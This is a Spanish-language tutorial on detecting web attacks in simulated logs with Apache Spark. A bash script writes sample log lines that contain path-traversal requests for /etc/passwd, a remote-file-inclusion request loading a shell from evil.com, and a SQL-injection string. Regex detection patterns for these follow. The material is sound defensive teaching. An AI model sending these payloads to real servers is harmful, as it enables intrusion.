# Detección de amenazas en logs web con Apache Spark

Ejemplo práctico de **análisis de seguridad usando Apache Spark** sin scripts externos.  
Se generarán **200 logs simulados**, algunos con comportamiento normal y otros con ataques.

Se detectarán:

- SQL Injection
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- Path Traversal
- Escaneo de vulnerabilidades
- IPs con actividad sospechosa

---

# 1. Arrancar Spark con Docker

```bash
docker run -it --rm -p 4040:4040 bitnami/spark:latest bash
```

Entrar en el shell interactivo de Spark:

```bash
spark-shell
```

---

# 2. Generar un archivo con 200 logs simulados

Salir temporalmente del shell de Spark o abrir otra terminal en el contenedor.

```bash
nano generar_logs.sh
```

Contenido:

```bash
#!/bin/bash

rm -f web_logs.txt

for i in {1..200}
do
    ip="192.168.1.$((RANDOM%20+1))"

    tipo=$((RANDOM%6))

    case $tipo in
        0)
            echo "$ip GET /index.php" >> web_logs.txt
            ;;
        1)
            echo "$ip GET /login.php" >> web_logs.txt
            ;;
        2)
            echo "$ip GET /index.php?page=../../etc/passwd" >> web_logs.txt
            ;;
        3)
            echo "$ip GET /index.php?page=http://evil.com/shell.txt" >> web_logs.txt
            ;;
        4)
            echo "$ip GET /login.php?user=admin' OR 1=1 --" >> web_logs.txt
            ;;
        5)
            echo "$ip GET /phpmyadmin" >> web_logs.txt
            ;;
    esac
done
```

Ejecutar:

```bash
chmod +x generar_logs.sh
./generar_logs.sh
```

Comprobar:

```bash
wc -l web_logs.txt
```

Debe mostrar:

```
200 web_logs.txt
```

---

# 3. Cargar logs en Spark

Volver a `spark-shell`.

```scala
val logs = spark.read.text("web_logs.txt")
logs.show(20,false)
```

---

# 4. Detectar ataques LFI / Path Traversal

```scala
logs.filter($"value".rlike("\\.\\./|/etc/passwd")).show(false)
```

Detecta accesos sospechosos a archivos del sistema.

---

# 5. Detectar Remote File Inclusion (RFI)

```scala
logs.filter($"value".rlike("http://|https://")).show(false)
```

Detecta intentos de cargar código remoto.

---

# 6. Detectar SQL Injection

```scala
logs.filter($"value".rlike("(?i)(union|select|or 1=1|--)")).show(false)
```

Detecta patrones típicos de inyección SQL.

---

# 7. Detectar escaneo de vulnerabilidades

```scala
logs.filter($"value".rlike("phpmyadmin|wp-login")).show(false)
```

Detecta bots buscando paneles de administración.

---

# 8. Detectar IPs más activas

Extraer IP de cada línea:

```scala
import org.apache.spark.sql.functions._

val ips = logs.withColumn("ip", split($"value"," ")(0))
```

Contar peticiones:

```scala
ips.groupBy("ip").count().orderBy(desc("count")).show()
```

IPs con muchas peticiones pueden indicar:

- bots
- escaneo automático
- ataques de fuerza bruta

---

# 9. Usar Spark SQL para detección

Registrar tabla:

```scala
logs.createOrReplaceTempView("logs")
```

Consulta para detectar LFI:

```scala
spark.sql("""
SELECT *
FROM logs
WHERE value RLIKE '\\.\\./|/etc/passwd'
""").show(false)
```

Consulta para detectar SQL Injection:

```scala
spark.sql("""
SELECT *
FROM logs
WHERE value RLIKE '(?i)(or 1=1|union|select|--)'
""").show(false)
```

---

# 10. Encontrar IPs con más ataques

```scala
spark.sql("""
SELECT split(value,' ')[0] as ip, COUNT(*) as ataques
FROM logs
WHERE value RLIKE '\\.\\./|http://|or 1=1|phpmyadmin'
GROUP BY ip
ORDER BY ataques DESC
""").show()
```

Esto permite identificar posibles atacantes.

----------
----------

